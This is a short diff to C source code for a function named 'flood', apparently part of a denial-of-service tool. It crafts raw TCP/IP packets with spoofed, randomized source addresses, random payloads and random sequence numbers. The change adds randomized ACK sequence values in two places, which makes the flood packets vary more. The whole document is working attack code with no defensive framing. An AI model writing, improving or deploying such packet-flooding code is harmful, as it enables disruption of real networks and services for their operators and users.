@@ -271,6 +271,7 @@ void *flood(void *par1)
                 memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
                 iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
                 tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
+                tcph->ack_seq = randnum(10000, 99999);
                 iph->saddr = (fourth_octet << 24) | (third_octet << 16) | (second_octet << 8) | (first_octet);
                 iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
                 iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
@@ -291,7 +292,7 @@ void *flood(void *par1)
             memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
             iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
             tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
-
+            tcph->ack_seq = randnum(10000, 99999);
             iph->saddr = (first_octet << 24) | (second_octet << 16) | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
             iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
             iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
